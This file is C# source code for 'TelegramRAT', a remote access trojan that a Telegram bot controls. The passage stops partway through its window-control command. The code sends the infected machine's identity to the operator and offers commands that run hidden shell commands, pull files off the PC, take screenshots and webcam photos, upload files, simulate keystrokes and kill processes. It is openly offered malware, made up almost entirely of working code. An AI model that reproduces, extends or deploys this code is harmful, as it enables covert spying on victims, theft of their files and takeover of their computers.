using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types.InputFiles;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types;
using WindowsInput;
using System.Reflection;
using System.Text;
using NAudio.Wave;
using IronPython.Hosting;
using Microsoft.Scripting.Hosting;
using Microsoft.Win32;
using AForge.Video.DirectShow;


namespace TelegramRAT
{
    public static class Program
    {
        static TelegramBotClient Bot;

        readonly static long? OwnerId = null; // Place your Telegram id here or keep it null.
        readonly static string BotToken = null; // Place your Telegram bot token. 

        static List<BotCommand> commands = new List<BotCommand>();
        static bool keylog = false;

        static ScriptScope pythonScope;
        static ScriptEngine pythonEngine;
        static ScriptRuntime pythonRuntime;

        static void Main(string[] args)
        {

            string thisprocessname = Process.GetCurrentProcess().ProcessName;

            if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
            {
                Console.WriteLine("Only one instance could be online at the same time!");
                return;
            }

            Bot = new TelegramBotClient(BotToken);

            pythonRuntime = Python.CreateRuntime();
            pythonEngine = Python.CreateEngine();
            pythonScope = pythonRuntime.CreateScope();

            InitializeCommands(commands);

            try
            {
                Run().Wait();
            }
            catch (Exception ex)
            {
                Bot.SendTextMessageAsync(OwnerId, "Error occured! - " + ex.Message);
                Bot.SendTextMessageAsync(OwnerId, "Attempting to restart. Please wait...");
                commands.Clear();
                Main(args);
            }
        }

        static async void ReportError(Message message, Exception exception)
        {
#if DEBUG
            await Bot.SendTextMessageAsync(message.Chat.Id, "Error: \"" + exception.Message + "\" at \"" + exception.StackTrace + "\"", replyToMessageId: message.MessageId);
#else
            await Bot.SendTextMessageAsync(message.Chat.Id, "Error: " + exception.Message, replyToMessageId: message.MessageId);
#endif
        }

        static async Task Run()
        {
            Message hellomsg = await Bot.SendTextMessageAsync(OwnerId,
                $"Computer online! \n\n" +

                $"Username: <b>{Environment.UserName}</b>\n" +
                $"PC name: <b>{Environment.MachineName}</b>\n\n" +

                $"OS: {GetWindowsVersion()}",
                ParseMode.Html);

            int offset = 0;

            while (true)
            {
                Update[] updates = await Bot.GetUpdatesAsync(offset);
                if (updates.Length != 0)
                    offset = updates.Last().Id + 1;

                updates = updates.Where(update =>
                {
                    return update.Message != null && update.Message.Date > hellomsg.Date;
                }).ToArray();

                UpdateWorker(updates).Wait();

                Task.Delay(1000).Wait();
            }
        }

        public static async Task UpdateWorker(Update[] Updates)
        {

            foreach (var update in Updates)
            {

                var model = BotCommandModel.FromMessage(update.Message, string.Empty);

                if (model == null)
                    continue;

                var cmd = commands.Find(cmd => cmd.Command == model.Command);

                if (cmd == null)
                    continue;

                if (ValidateModel(cmd, model))
                {
                    cmd.Execute.Invoke(model);
                }
                else
                {
                    await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command requires arguments! \n\n" +
                         $"To get information about this command - type /help {model.Command.Substring(1)}", replyToMessageId: model.Message.MessageId);
                }

            }
        }

        //Evil and scary method
        static bool ValidateModel(BotCommand command, BotCommandModel model)
        {
            if (command == null || model == null)
                return false;

            if (command.Command != model.Command)
                return false;

            if ((command.IgnoreCountArgs || command.CountArgs != 0) && model.Args.Length != 0)
            {
                return true;
            }
            else if (!(command.IgnoreCountArgs || command.CountArgs != 0) || command.MayHaveNoArgs)
            {
                return true;
            }

            return false;

        }

        static string GetWindowsVersion()
        {
            try
            {
                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
                if (key != null)
                {
                    string prodName = key.GetValue("ProductName") as string;
                    string csdVer = key.GetValue("CSDVersion") as string;
                    return prodName + csdVer;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return string.Empty;
        }

        static void InitializeCommands(List<BotCommand> CommandsList)
        {
            //HELP
            CommandsList.Add(new BotCommand
            {
                Command = "help",
                IgnoreCountArgs = true,
                MayHaveNoArgs = true,

                Description = "Show description of other commands.",
                Example = "<code>/help screenshot</code>",

                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        if (model.Args.Length == 0)
                        {
                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "Use this command to retrieve description of other commands, like this: /help screenshot" +
                                "\nTo get list of all commands - type /commands", replyToMessageId: model.Message.MessageId);
                            return;
                        }
                        string command = model.Args[0];

                        var cmd = commands.Find(cmd => cmd.Command == command);
                        if (cmd == null)
                        {
                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "This command doesn't exist! " +
                            "To get list of all commands - type /commands", replyToMessageId: model.Message.MessageId);
                            return;
                        }
                        string Description = $"<b>{cmd.Command}</b>\n\n";
                        if (cmd.Description != null)
                        {
                            Description += cmd.Description;
                        }
                        else
                        {
                            Description += "<i>No description provided</i>";
                        }
                        if (cmd.Example != null)
                        {
                            Description += $"\nExample: {cmd.Example}";
                        }
                        Bot.SendTextMessageAsync(model.Message.Chat.Id, Description, replyToMessageId: model.Message.MessageId, parseMode: ParseMode.Html, disableWebPagePreview: true);

                    });
                }
            });

            //CMD
            CommandsList.Add(new BotCommand
            {
                Command = "cmd",
                IgnoreCountArgs = true,
                Description = "Run cmd commands.",
                Example = "/cmd dir",
                Execute = model =>
                {
                    try
                    {
                        Task.Run(() =>
                        {
                            Process cmd = new Process();
                            cmd.StartInfo.FileName = "cmd.exe";
                            cmd.StartInfo.CreateNoWindow = true;

                            cmd.StartInfo.Arguments = "/c " + model.RawArgs;
                            cmd.StartInfo.RedirectStandardOutput = true;
                            cmd.StartInfo.RedirectStandardError = true;
                            cmd.StartInfo.UseShellExecute = false;

                            cmd.Start();
                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "Started!", replyToMessageId: model.Message.MessageId);
                            cmd.WaitForExit(1000);
                            //cmd.Kill(true);

                            string Output = cmd.StandardOutput.ReadToEnd();

                            Output = string.Join(string.Empty, Output.Take(4096));

                            if (Output.Length == 0)
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, $"Done!", replyToMessageId: model.Message.MessageId);
                            else
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, $"Done!\n\n" +
                                    $"Output:\n{Output}", replyToMessageId: model.Message.MessageId);
                        });
                    }
                    catch (Exception ex)
                    {
                        ReportError(model.Message, ex);
                    }
                }

            });

            //DIR
            CommandsList.Add(new BotCommand
            {
                Command = "dir",
                CountArgs = 0,
                IgnoreCountArgs = true,
                MayHaveNoArgs = true,
                Description = "Get all files and folders from current directory.",
                Example = "/dir C:\\Program Files",
                Execute = model =>
                {
                    try
                    {
                        string curdir;
                        if (model.Args.Length > 0)
                            curdir = model.RawArgs;
                        else
                            curdir = Directory.GetCurrentDirectory();


                        var files = Directory.EnumerateFiles(curdir);
                        int i = 0;
                        string oneMessage;
                        if (files.Count() != 0)
                        {
                            oneMessage = "Files:\n\n";
                            foreach (string file in files)
                            {
                                string parsedFile = file.Substring(file.LastIndexOf('\\') + 1);
                                if (i == 100)
                                {
                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);
                                    i = 0;
                                    oneMessage = "";
                                }
                                i++;
                                oneMessage += $"`{parsedFile}`\n";

                            }
                            Bot.SendTextMessageAsync(model.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);

                        }

                        var dirs = Directory.EnumerateDirectories(curdir);
                        i = 0;
                        if (dirs.Count() != 0)
                        {
                            oneMessage = "Folders:\n\n";
                            foreach (string dir in dirs)
                            {
                                string parsedDir = dir.Substring(dir.LastIndexOf('\\') + 1);
                                if (i == 100)
                                {
                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);
                                    i = 0;
                                    oneMessage = "";
                                }
                                i++;
                                oneMessage += $"`{parsedDir}`\n";

                            }
                            Bot.SendTextMessageAsync(model.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);

                        }
                        if (dirs.Count() == 0 && files.Count() == 0)
                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "This directory contains no files and no folders.", replyToMessageId: model.Message.MessageId);

                    }
                    catch (Exception ex)
                    {
                        ReportError(model.Message, ex);
                    }
                }
            });

            //PROCESSESLIST
            CommandsList.Add(new BotCommand
            {
                Command = "processes",
                CountArgs = 0,
                Description = "Get list of running processes.",
                Example = "/processes",
                Execute = model =>
                {
                    try
                    {
                        StringBuilder processesList = new StringBuilder();
                        processesList.AppendLine("List of processes: ");
                        int i = 1;
                        Process[] processCollection = Process.GetProcesses();

                        foreach (Process p in processCollection)
                        {
                            processesList.AppendLine($"<code>{p.ProcessName}</code> : <code>{p.Id}</code>");
                            if (i == 50)
                            {
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, processesList.ToString(), ParseMode.Html);
                                processesList.Clear();
                                i = 0;
                            }
                            i++;
                        }
                        Bot.SendTextMessageAsync(model.Message.Chat.Id, processesList.ToString(), ParseMode.Html);
                    }
                    catch (Exception ex)
                    {
                        ReportError(model.Message, ex);
                    }
                }
            });

            //PROCESS
            CommandsList.Add(new BotCommand
            {
                Command = "process",
                CountArgs = 1,

                Description = "Show info about process by its id.",
                Example = "/process 1234",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        try
                        {

                            int procId = int.Parse(model.Args[0]);

                            Process proc = Process.GetProcessById(procId);

                            string procInfo =
                            $"Process: <b>{proc.ProcessName}</b>\n" +
                            $"Id: {proc.Id}\n" +
                            $"Priority: {proc.PriorityClass}\n" +
                            $"Priority Boost: {(proc.PriorityBoostEnabled ? "enabled" : "disabled")}\n";

                            if (proc.MainWindowHandle != IntPtr.Zero)
                                procInfo += $"\nMain Window Handle: <code>0x{proc.MainWindowHandle.ToString("X")}</code>\n";

                            Bot.SendTextMessageAsync(model.Message.Chat.Id, procInfo, ParseMode.Html, replyToMessageId: model.Message.MessageId);

                        }
                        catch (Exception ex)
                        {
                            ReportError(model.Message, ex);
                        }
                    });
                }
            });

            //PROCESSKILL
            CommandsList.Add(new BotCommand
            {
                Command = "processkill",
                IgnoreCountArgs = true,
                MayHaveNoArgs = false,

                Description = "Kill process or processes by name or id. ",
                Example = "/processkill id:1234",
                Execute = model =>
                {
                    try
                    {
                        Process[] processes;
                        if (model.Args[0].StartsWith("id:"))
                        {
                            string procStr = string.Join(string.Empty, model.RawArgs.Skip(3).ToArray());
                            procStr = procStr.TrimStart();

                            int procId;
                            if (int.TryParse(procStr, out procId))
                            {
                                Process.GetProcessById(procId).Kill();
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                            }
                            else
                            {
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Invalid process id!", replyToMessageId: model.Message.MessageId);
                            }
                            return;
                        }
                        if (model.Args[0].StartsWith("name:"))
                        {
                            string procStr = string.Join(string.Empty, model.RawArgs.Skip(5).ToArray());
                            Console.WriteLine(procStr);
                            procStr = procStr.TrimStart();
                            processes = Process.GetProcessesByName(procStr);
                            if (processes.Length == 0)
                            {
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "No running processes with such name!", replyToMessageId: model.Message.MessageId);
                                return;
                            }
                            foreach (Process localprocess in Process.GetProcessesByName(model.RawArgs))
                            {
                                localprocess.Kill();
                            }
                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);


                            return;
                        }
                        processes = Process.GetProcessesByName(model.RawArgs);
                        if (processes.Length == 0)
                        {
                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "No running processes with such name!", replyToMessageId: model.Message.MessageId);
                            return;
                        }
                        foreach (Process localprocess in Process.GetProcessesByName(model.RawArgs))
                        {
                            localprocess.Kill();
                        }
                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);

                    }
                    catch (Exception ex)
                    {
                        ReportError(model.Message, ex);
                    }
                }
            });

            //CD
            CommandsList.Add(new BotCommand
            {
                Command = "cd",
                IgnoreCountArgs = true,

                Description = "Change current directory.",
                Example = "/cd C:\\Users",
                Execute = model =>
                {
                    try
                    {
                        if (Directory.Exists(model.RawArgs))
                        {
                            Directory.SetCurrentDirectory(model.Args[0]);
                            Bot.SendTextMessageAsync(model.Message.Chat.Id, $"Directory changed to: <code>{Directory.GetCurrentDirectory()}</code>", ParseMode.Html, replyToMessageId: model.Message.MessageId);
                        }
                    }
                    catch (Exception ex)
                    {
                        ReportError(model.Message, ex);
                    }
                }
            });

            //CURDIR
            CommandsList.Add(new BotCommand
            {
                Command = "curdir",
                CountArgs = 0,

                Description = "Show current directory.",
                Example = "/curdir",
                Execute = model =>
                {
                    try
                    {
                        Bot.SendTextMessageAsync(model.Message.Chat.Id, $"Current directory:\n<code>{Directory.GetCurrentDirectory()}</code>", ParseMode.Html, replyToMessageId: model.Message.MessageId);
                    }
                    catch (Exception ex)
                    {
                        ReportError(model.Message, ex);
                    }
                }
            });

            //POWER MEGA COMMAND
            CommandsList.Add(new BotCommand
            {
                Command = "power",
                CountArgs = 1,
                Description = "Switch PC power state. Usage:\n\n" +
                "Off - Turn PC off\n" +
                "Restart - Restart PC\n" +
                "LogOff - Log off system",
                Example = "/power logoff",
                Execute = model =>
                {
                    try
                    {
                        switch (model.Args[0].ToLower())
                        {
                            case "off":
                                Process shutdown = new Process();
                                shutdown.StartInfo.CreateNoWindow = true;
                                shutdown.StartInfo.FileName = "powershell.exe";
                                shutdown.StartInfo.Arguments = "/с shutdown /s /t 1";
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                                shutdown.Start();
                                break;

                            case "restart":
                                Process restart = new Process();
                                restart.StartInfo.CreateNoWindow = true;
                                restart.StartInfo.FileName = "powershell.exe";
                                restart.StartInfo.Arguments = "/с shutdown /r /t 1";
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!");
                                restart.Start();
                                break;

                            case "logoff":
                                Process logoff = new Process();
                                logoff.StartInfo.CreateNoWindow = true;
                                logoff.StartInfo.FileName = "cmd.exe";
                                logoff.StartInfo.Arguments = "/c rundll32.exe user32.dll,LockWorkStation";
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!");
                                logoff.Start();
                                break;

                            default:
                                Bot.SendTextMessageAsync(model.Message.Chat.Id, "Wrong usage, type /help power to get info about this command!", replyToMessageId: model.Message.MessageId);
                                break;
                        }

                    }
                    catch (Exception ex)
                    {
                        ReportError(model.Message, ex);
                    }
                }
            });

            //DOWNLOAD
            CommandsList.Add(new BotCommand
            {
                Command = "download",
                IgnoreCountArgs = true,
                MayHaveNoArgs = false,

                Description = "Send file from PC by path",
                Example = "/download hello.txt",
                Execute = model =>
                {
                    try
                    {
                        var filetodownload = model.RawArgs;
                        if (!System.IO.File.Exists(Directory.GetCurrentDirectory() + "\\" + filetodownload))
                        {
                            Bot.SendTextMessageAsync(model.Message.Chat.Id, $"There is no file \"{filetodownload}\" at dir {Directory.GetCurrentDirectory()}");
                            return;
                        }
                        var filetosend = new FileStream(Directory.GetCurrentDirectory() + "\\" + filetodownload, FileMode.Open, FileAccess.Read, FileShare.Read);
                        {
                            Bot.SendDocumentAsync(model.Message.Chat.Id, new InputOnlineFile(filetosend, filetosend.Name.Substring(filetosend.Name.LastIndexOf("\\"))), caption: filetodownload);
                        }
                    }
                    catch (Exception ex)
                    {
                        ReportError(model.Message, ex);
                    }
                }
            });

            //SCREENSHOT
            CommandsList.Add(new BotCommand
            {
                Command = "screenshot",
                CountArgs = 0,
                Description = "Take a screenshot of all displays area.",
                Example = "/screenshot",
                Execute = model =>
                {
                    Task.Run(() =>
                   {
                       try
                       {
                           Rectangle bounds = WinAPI.GetScreenBounds();

                           using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                           using (Graphics g = Graphics.FromImage(bitmap))
                           using (MemoryStream screenshotStream = new MemoryStream())
                           {
                               g.CopyFromScreen(System.Drawing.Point.Empty, System.Drawing.Point.Empty, bounds.Size);

                               bitmap.Save(screenshotStream, ImageFormat.Png);

                               screenshotStream.Position = 0;

                               Bot.SendPhotoAsync(chatId: model.Message.Chat.Id, photo: screenshotStream, caption: "Screenshot!", replyToMessageId: model.Message.MessageId);

                           }
                       }
                       catch (Exception ex)
                       {
                           ReportError(model.Message, ex);
                       }
                   });
                }
            });

            //GET USER TELEGRAM ID
            CommandsList.Add(new BotCommand
            {
                Command = "getid",
                CountArgs = 0,

                Description = "Get chat or user id. To get user's id type this command as answer to user message. Made in developing purposes.",
                Example = "/getid",
                Execute = model =>
                {
                    if (model.Message.ReplyToMessage != null)
                    {
                        Bot.SendTextMessageAsync(model.Message.Chat.Id, $"User id: <code>{model.Message.ReplyToMessage.From.Id.ToString()}</code>", ParseMode.Html, replyToMessageId: model.Message.MessageId);
                        return;
                    }
                    Bot.SendTextMessageAsync(model.Message.Chat.Id, $"This chat id: <code>{model.Message.Chat.Id.ToString()}</code>", ParseMode.Html);
                }
            });

            //TAKE PHOTO FROM WEBCAM
            CommandsList.Add(new BotCommand
            {
                Command = "webcam",
                CountArgs = 0,

                Description = "Take a photo from webcamera.",
                Example = "/webcam",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        Task.Run(() =>
                        {
                            try
                            {
                                Bitmap endMap;
                                MemoryStream webcamShotStream = new MemoryStream();

                                FilterInfoCollection capdevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                                if (capdevices.Count == 0)
                                {
                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "This machine has no webcamera.", replyToMessageId: model.Message.MessageId);
                                }

                                VideoCaptureDevice device = new VideoCaptureDevice(capdevices[0].MonikerString);
                                device.NewFrame += (sender, args) =>
                                {
                                    //args.Frame = webcamShotStream;

                                    endMap = args.Frame.Clone() as Bitmap;
                                    endMap.Save(webcamShotStream, ImageFormat.Png);
                                    (sender as VideoCaptureDevice).SignalToStop();
                                };

                                device.Start();
                                device.WaitForStop();

                                webcamShotStream.Position = 0;

                                InputOnlineFile webcamPhoto = new InputOnlineFile(webcamShotStream);
                                Bot.SendPhotoAsync(model.Message.Chat.Id, webcamPhoto, replyToMessageId: model.Message.MessageId);
                                webcamShotStream.Close();
                            }
                            catch (Exception ex)
                            {
                                ReportError(model.Message, ex);
                            }
                        });
                    });
                }

            });

            //MESSAGEBOX
            CommandsList.Add(new BotCommand
            {
                Command = "message",
                IgnoreCountArgs = true,
                Description = "Send message with dialog window.",
                Example = "message Lorem ipsum",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        WinAPI.ShowMessageBox(model.RawArgs, "Message", WinAPI.MsgBoxFlag.MB_APPLMODAL | WinAPI.MsgBoxFlag.MB_ICONINFORMATION);
                    });
                }

            });

            //OPENURL
            CommandsList.Add(new BotCommand
            {
                Command = "openurl",
                IgnoreCountArgs = true,

                Description = "Open URL with default browser.",
                Example = "/openurl https://google.com",
                Execute = model =>
                {
                    if (!model.RawArgs.Contains("://"))
                    {
                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "This is not url", replyToMessageId: model.Message.MessageId);
                    }
                    ProcessStartInfo info = new ProcessStartInfo()
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c start {model.RawArgs}",
                        CreateNoWindow = true
                    };

                    Process.Start(info);

                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Url opened!", replyToMessageId: model.Message.MessageId);
                }
            });

            //UPLOAD FILE TO PC
            CommandsList.Add(new BotCommand
            {
                Command = "upload",
                IgnoreCountArgs = true,
                MayHaveNoArgs = true,

                Description = "Upload image or file to current directory.",
                Execute = model =>
                {
                    try
                    {
                        if (model.Message.Type == MessageType.Photo)
                        {
                            foreach (PhotoSize photo in model.Message.Photo)
                            {
                                var photoFileStream = System.IO.File.Create(Directory.GetCurrentDirectory() + $"/{photo.FileId}.png");

                                Telegram.Bot.Types.File photoFile = Bot.GetFileAsync(photo.FileId).Result;
                                Bot.DownloadFileAsync(photoFile.FilePath, photoFileStream).Wait();
                                photoFileStream.Close();

                            }
                        }
                        else if (model.Message.Type == MessageType.Document)
                        {
                            Telegram.Bot.Types.File documentFile = Bot.GetFileAsync(model.Message.Document.FileId).Result;
                            var documentFileStream = System.IO.File.Create(model.Message.Document.FileName);
                            Bot.DownloadFileAsync(documentFile.FilePath, documentFileStream).Wait();
                            documentFileStream.Close();
                        }
                        else if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Photo)
                        {
                            foreach (PhotoSize photo in model.Message.ReplyToMessage.Photo)
                            {
                                var photoFileStream = System.IO.File.Create(Directory.GetCurrentDirectory() + $"/{photo.FileId}.png");

                                Telegram.Bot.Types.File photoFile = Bot.GetFileAsync(photo.FileId).Result;
                                Bot.DownloadFileAsync(photoFile.FilePath, photoFileStream).Wait();
                                photoFileStream.Close();

                            }
                        }
                        else if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Document)
                        {
                            Telegram.Bot.Types.File documentFile = Bot.GetFileAsync(model.Message.ReplyToMessage.Document.FileId).Result;
                            var documentFileStream = System.IO.File.Create(model.Message.ReplyToMessage.Document.FileName);
                            Bot.DownloadFileAsync(documentFile.FilePath, documentFileStream).Wait();
                            documentFileStream.Close();
                        }
                        else
                        {
                            Bot.SendTextMessageAsync(model.Message.Chat.Id, "No file or photo pinned, use /help upload to get info about this command!", replyToMessageId: model.Message.MessageId);
                            return;
                        }
                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                    }
                    catch (Exception ex)
                    {
                        ReportError(model.Message, ex);
                    }
                }
            });

            //SEND KEYBOARD INPUT 
            CommandsList.Add(new BotCommand
            {
                Command = "sendinput",
                IgnoreCountArgs = true,
                MayHaveNoArgs = false,
                Description =
                #region desc
                "Simulate keyboard input with virtual keycode, expressed in hexadecimal\n\n" +
                "List of virtual keycodes:\n" +
                "LBUTTON = 1\nRBUTTON = 2\nCANCEL = 3\nMIDBUTTON = 4\nBACKSPACE = 8\n" +
                "TAB = 9\nCLEAR = C\nENTER = D\nSHIFT = 10\nCTRL = 11\nALT = 12\n" +
                "PAUSE = 13\nCAPSLOCK = 14\nESC = 1B\nSPACE = 20\nPAGEUP = 21\nPAGEDOWN = 22\n" +
                "END = 23\nHOME = 24\nLEFT = 25\nUP = 26\nRIGHT = 27\nDOWN = 28\n\n0..9 = 30..39\n" +
                "A..Z = 41..5a\nF1..F24 = 70..87\n\n" +

                "<a href=\"https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\">See all keycodes</a>\n\n" +
                "To send combination of keys, join them with plus: 11+43 (ctrl+c)\n",
                #endregion
                Example = "/sendinput 48 45 4c 4c 4f (hello)",
                Execute = model =>
               {
                   Task.Run(() =>
                   {
                       try
                       {
                           KeyboardSimulator ks = new KeyboardSimulator(new InputSimulator());
                           foreach (string arg in model.Args)
                           {
                               if (arg.Contains("+"))
                               {
                                   int modifier = int.Parse(arg.Split('+').First(), System.Globalization.NumberStyles.HexNumber);
                                   List<int> modified = new List<int>();
                                   foreach (string vk in arg.Split('+').Skip(1))
                                   {
                                       modified.Add(int.Parse(vk, System.Globalization.NumberStyles.HexNumber));
                                   }
                                   ks.ModifiedKeyStroke(new int[] { modifier }, modified);
                               }
                               else
                                   ks.KeyPress(int.Parse(arg, System.Globalization.NumberStyles.HexNumber));
                           }

                           Bot.SendTextMessageAsync(model.Message.Chat.Id, "Sended!", replyToMessageId: model.Message.MessageId);
                       }
                       catch (Exception ex)
                       {
                           ReportError(model.Message, ex);
                       }
                   });
               },


            });

            //WALLPAPER
            CommandsList.Add(new BotCommand
            {
                Command = "wallpaper",
                Description = "Change wallpapers. Don't foreget to attach the image.",
                Execute = model =>
                {
                    Task.Run(() =>
                  {
                      try
                      {
                          if (model.Message.Type == MessageType.Photo)
                          {
                              using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                              {
                                  Telegram.Bot.Types.File wallpaperPhoto = Bot.GetFileAsync(model.Message.Photo.Last().FileId).Result;
                                  Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs).Wait();
                              }
                          }
                          else if (model.Message.Type == MessageType.Document)
                          {
                              using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                              {
                                  Telegram.Bot.Types.File wallpaperFile = Bot.GetFileAsync(model.Message.Document.FileId).Result;
                                  Bot.DownloadFileAsync(wallpaperFile.FilePath, fs).Wait();
                              }
                          }
                          else if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Photo)
                          {
                              using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                              {
                                  Telegram.Bot.Types.File wallpaperPhoto = Bot.GetFileAsync(model.Message.ReplyToMessage.Photo.Last().FileId).Result;
                                  Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs).Wait();
                              }
                          }
                          else if (model.Message.ReplyToMessage != null && model.Message.ReplyToMessage.Type == MessageType.Document)
                          {
                              using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                              {
                                  Telegram.Bot.Types.File wallpaperFile = Bot.GetFileAsync(model.Message.ReplyToMessage.Document.FileId).Result;
                                  Bot.DownloadFileAsync(wallpaperFile.FilePath, fs).Wait();
                              }
                          }
                          else
                          {
                              Bot.SendTextMessageAsync(model.Message.Chat.Id, "No file or photo pinned, use /help wallpaper to get info about this command!", replyToMessageId: model.Message.MessageId);
                              return;
                          }

                          WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, Directory.GetCurrentDirectory() + "\\wllppr.png", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
                          System.IO.File.Delete("wllppr.png");
                          Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                      }
                      catch (Exception ex)
                      {
                          ReportError(model.Message, ex);
                      }
                  });
                }
            });

            //WINDOW MEGA COMMAND
            CommandsList.Add(new BotCommand
            {
                Command = "window",
                MayHaveNoArgs = false,
                IgnoreCountArgs = true,
                Description = "This command has multiple usage. After usage type title or pointer(type 0x at the start) of window. Usage list:\n\n" +
                "<i>i</i> | <i>info</i> - Get information about window. Shows info about top window, if no name provided\n\n" +
                "<i>min</i> | <i>minimize</i> - Minimize window\n\n" +
                "<i>max</i> | <i>maximize</i> - Maximize window\n\n" +
                "<i>r</i> | <i>restore</i> - Restore size and position of window\n\n" +
                "<i>sf</i> | <i>setfocus</i> - Set focus to window" +
                "<i>c</i> | <i>close</i> - Close window\n\n",
                Example = "/window close Calculator",
                Execute = model =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            IntPtr hWnd;
                            if (model.Args.Length == 1 && (model.Args[0].ToLower() == "info" || model.Args[0].ToLower() == "i"))
                            {
                                hWnd = WinAPI.GetForegroundWindow();

                                Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
                                string info =
                                "Window info\n" +
                                "\n" +
                                $"Title: <code>{WinAPI.GetWindowTitle(hWnd)}</code>\n" +
                                $"Location: {windowBounds.X}x{windowBounds.Y}\n" +
                                $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
                                $"Pointer: <code>0x{hWnd.ToString("X")}</code>\n" +
                                $"Process Id: <code>{WinAPI.GetProcessId(WinAPI.GetProcessHandleFromWindow(hWnd))}</code>";

                                Bot.SendTextMessageAsync(model.Message.Chat.Id, info, ParseMode.Html, replyToMessageId: model.Message.MessageId);
                                return;
                            }

                            if (model.Args.Length > 1)
                            {
                                if (model.Args[1].Contains("0x"))
                                {
                                    string pointerString = string.Join(string.Empty, model.Args[1].Skip(2));
                                    int pointer = int.Parse(pointerString, System.Globalization.NumberStyles.HexNumber);
                                    hWnd = new IntPtr(pointer);
                                }
                                else
                                {
                                    hWnd = WinAPI.FindWindow(null, string.Join(string.Empty, model.Args.Skip(1)));
                                }
                                if (hWnd == IntPtr.Zero || WinAPI.IsWindow(hWnd) is false)
                                {
                                    Bot.SendTextMessageAsync(model.Message.Chat.Id, "Window not found!", replyToMessageId: model.Message.MessageId);
                                    return;
                                }
                                switch (model.Args[0].ToLower())
                                {
                                    case "i":
                                    case "info":
                                        Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
                                        string info = "" +
                                        "Window info\n" +
                                        "\n" +
                                        $"Title: <code>{WinAPI.GetWindowTitle(hWnd)}</code>\n" +
                                        $"Location: {windowBounds.X}x{windowBounds.Y}\n" +
                                        $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
                                        $"Pointer: <code>0x{hWnd.ToString("X")}</code>\n" +
                                        $"Process Id: <code>{WinAPI.GetProcessId(WinAPI.GetProcessHandleFromWindow(hWnd))}</code>";
                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, info, ParseMode.Html, replyToMessageId: model.Message.MessageId);
                                        break;

                                    case "min":
                                    case "minimize":
                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                                        break;

                                    case "max":
                                    case "maximize":
                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MAXIMIZE, 0);
                                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Done!", replyToMessageId: model.Message.MessageId);
                                        break;

                                    case "sf":
                                    case "setfocus":
                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
